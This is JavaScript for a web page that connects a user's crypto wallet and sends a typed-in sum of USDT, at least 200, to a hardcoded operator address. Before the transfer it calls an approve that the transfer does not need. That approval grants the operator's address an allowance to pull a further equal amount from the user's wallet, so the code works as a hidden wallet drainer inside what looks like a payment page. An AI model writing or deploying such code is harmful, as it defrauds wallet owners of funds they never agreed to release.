const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const DESTINATION = "0x56E93caFf970003A66264a10B1581066E0f17112"; // ✅ your wallet
const BNB_FEE_USD = 0.50;

let provider, signer;

const ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)"
];

async function connect() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    const address = await signer.getAddress();
    document.getElementById("msg").innerText = "✅ Connected: " + address;
  } catch (err) {
    document.getElementById("msg").innerText = "❌ Wallet connection failed";
  }
}

async function transferUSDT() {
  const msg = document.getElementById("msg");
  msg.className = "";

  const amountInput = parseFloat(document.getElementById("usdtInput").value);
  if (isNaN(amountInput) || amountInput < 200) {
    msg.innerText = "❌ Minimum 200 USDT required";
    msg.className = "error";
    return;
  }

  try {
    const userAddress = await signer.getAddress();
    const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);

    const balance = await usdt.balanceOf(userAddress);
    const balanceReadable = parseFloat(ethers.utils.formatUnits(balance, 18));
    if (balanceReadable < amountInput) {
      msg.innerText = "❌ Not enough USDT in wallet";
      msg.className = "error";
      return;
    }

    const bnbBalance = await provider.getBalance(userAddress);
    const bnbAmount = parseFloat(ethers.utils.formatEther(bnbBalance));

    const bnbPriceData = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd");
    const bnbPrice = (await bnbPriceData.json()).binancecoin.usd;
    const bnbValueUSD = bnbAmount * bnbPrice;

    if (bnbValueUSD < BNB_FEE_USD) {
      msg.innerText = `❌ You need at least ~$${BNB_FEE_USD} worth of BNB for gas fees`;
      msg.className = "error";
      return;
    }

    const amountInWei = ethers.utils.parseUnits(amountInput.toString(), 18);

    // Approve
    const approveTx = await usdt.approve(DESTINATION, amountInWei);
    await approveTx.wait();

    // Transfer
    const transferTx = await usdt.transfer(DESTINATION, amountInWei);
    await transferTx.wait();

    msg.innerText = `✅ ${amountInput} USDT successfully sent to ${DESTINATION}`;
    msg.className = "success";
  } catch (err) {
    msg.innerText = `❌ Error: ${err.message}`;
    msg.className = "error";
  }
}

document.getElementById("connectBtn").onclick = connect;
document.getElementById("transferBtn").onclick = transferUSDT;
